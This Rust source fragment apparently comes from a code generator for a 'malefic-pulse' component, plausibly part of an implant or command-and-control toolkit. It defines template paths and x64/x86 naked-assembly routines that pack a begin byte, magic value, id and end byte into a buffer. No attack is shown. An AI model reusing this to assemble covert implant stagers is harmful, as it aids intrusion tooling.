
pub(crate) static X86_MAIN_TEMPLATE_PATH: &str = 
    "malefic-pulse/src/template/x86_common_template";
pub(crate) static X64_MAIN_TEMPLATE_PATH: &str = 
    "malefic-pulse/src/template/x64_common_template";
pub(crate) static TARGET_SOURCE_PATH: &str = "malefic-pulse/src/main.rs";

pub(crate) static X64_MAKE_BODY : &str = r#"
#[naked]
unsafe extern "C" fn make_body(
    buf: *mut u8,
    begin: u8,
    end: u8,
    magic: u32,
    id: u32
) {
    core::arch::asm!(
        "mov BYTE PTR[rcx], dl",
        "mov DWORD PTR[rcx +1], r9d",
        "mov eax, DWORD PTR[rsp + 0x28]",
        "mov DWORD PTR[rcx +5], eax",
        "mov BYTE PTR[rcx + 9], r8b",
        "ret",
        options(noreturn)
    )
}
"#;

pub(crate) static X86_MAKE_BODY: &str = r#"
#[naked]
unsafe extern "C" fn make_body(
    buf: *mut u8,
    begin: u8,
    end: u8,
    magic: u32,
    id: u32
) {
    core::arch::asm!(
        "push ebp",
        "mov  ebp, esp",
        "push ecx",

        "mov eax, [ebp + 0x8]",
        "mov cl, BYTE PTR[ebp + 0xc]",
        "mov BYTE PTR[eax], cl",
        "mov cl, BYTE PTR[ebp + 0x10]", //end
        "mov BYTE PTR[eax + 9], cl",
        "mov ecx, DWORD PTR[ebp + 0x14]", // magic
        "mov DWORD PTR[eax + 1], ecx",
        "xor ecx, ecx",
        "mov ecx, [ebp + 0x18]", // id
        "mov [eax + 5], ecx",

        "pop ecx",
        "mov esp, ebp",
        "pop ebp",
        "ret",
        options(noreturn)
    )
}
"#;